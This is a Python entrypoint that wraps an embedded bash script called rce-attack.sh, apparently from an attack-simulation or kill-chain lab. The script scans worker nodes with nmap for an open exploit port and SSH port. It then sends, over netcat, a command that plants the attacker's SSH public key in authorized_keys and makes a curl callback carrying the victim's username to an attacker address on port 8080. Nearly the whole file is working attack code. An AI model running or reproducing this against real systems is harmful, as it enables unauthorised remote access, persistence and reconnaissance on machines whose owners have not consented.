#!/usr/bin/env python3
"""Python entrypoint for rce-attack.sh."""

from __future__ import annotations

import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

_SCRIPT = r"""#!/usr/bin/env bash
set -euo pipefail

FILE_IP="/tmp/iphost"
KEY_PATH="$HOME/.ssh/id_ed25519"
KC_DATA_SUBDIR="${KC_DATA_SUBDIR:-KC4}"
RCE_PORT="${KC_RCE_PORT:-${RCE_PORT:-25}}"
SSH_PORT="${KC_SSH_PORT:-${SSH_PORT:-4222}}"
FILEATTACK="$DATA_PATH/$KC_DATA_SUBDIR/attackaddr"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NODE_IP_HELPER="${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/list-node-ips.sh"

[[ -f "${NODE_IP_HELPER}" ]] || { echo "Missing helper: ${NODE_IP_HELPER}" >&2; exit 1; }
# shellcheck source=../../lib/common/list-node-ips.sh
source "${NODE_IP_HELPER}"

mkdir -p "$DATA_PATH/$KC_DATA_SUBDIR/analysis"
mapfile -t nodes < <(list_worker_node_ips "$FILE_IP" | sed '/^$/d')
if [[ "${#nodes[@]}" -eq 0 ]]; then
  echo "No node found"
  exit 1
fi
echo ">> Nodes found (${#nodes[@]}): ${nodes[*]}"

ATTACKER_NODE=""
for n in "${nodes[@]}"; do
  out="$(nmap -p "${RCE_PORT},${SSH_PORT}" -Pn -oG - "$n" 2>/dev/null)"
  if echo "$out" | grep -q "${RCE_PORT}/open" && echo "$out" | grep -q "${SSH_PORT}/open"; then
    echo "FOUND: $n (ports ${RCE_PORT} and ${SSH_PORT} are open)"
    ATTACKER_NODE="$n"
    echo "$ATTACKER_NODE" > "$FILEATTACK"
    break
  fi
done

[[ -n "${ATTACKER_NODE}" ]] || { echo "No worker node with both ports ${RCE_PORT} and ${SSH_PORT} open." >&2; exit 1; }
command -v ssh-keygen >/dev/null 2>&1 || { echo "Missing command: ssh-keygen" >&2; exit 1; }
command -v nc >/dev/null 2>&1 || { echo "Missing command: nc" >&2; exit 1; }
mkdir -p "$(dirname "$KEY_PATH")"
if [[ ! -f "$KEY_PATH" ]]; then
  ssh-keygen -t ed25519 -N "" -f "$KEY_PATH" -q
fi
echo -n "echo \"$(cat "$KEY_PATH.pub")\" >> ~/.ssh/authorized_keys && curl http://$ATTACKERADDR:8080/\$(id -un)" \
  | nc -w9 "$ATTACKER_NODE" "$RCE_PORT" >/dev/null 2>&1
"""


def _run_embedded_bash(script: str, argv: list[str]) -> int:
    """Run the embedded legacy payload through Bash with a Python-owned entrypoint."""
    try:
        current = Path(__file__).resolve()
        for parent in current.parents:
            lib_dir = parent / "lib"
            if (lib_dir / "common" / "shell.py").is_file():
                sys.path.insert(0, str(lib_dir))
                break
        from common.shell import run_embedded_bash
        return run_embedded_bash(script, argv)
    except Exception:
        with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".sh", delete=False) as handle:
            handle.write(script)
            path = handle.name
        try:
            Path(path).chmod(Path(path).stat().st_mode | stat.S_IXUSR)
            completed = subprocess.run(["/usr/bin/env", "bash", path, *argv], text=True)
            return int(completed.returncode)
        finally:
            try:
                os.unlink(path)
            except FileNotFoundError:
                pass


def main() -> None:
    raise SystemExit(_run_embedded_bash(_SCRIPT, sys.argv[1:]))


if __name__ == "__main__":
    main()
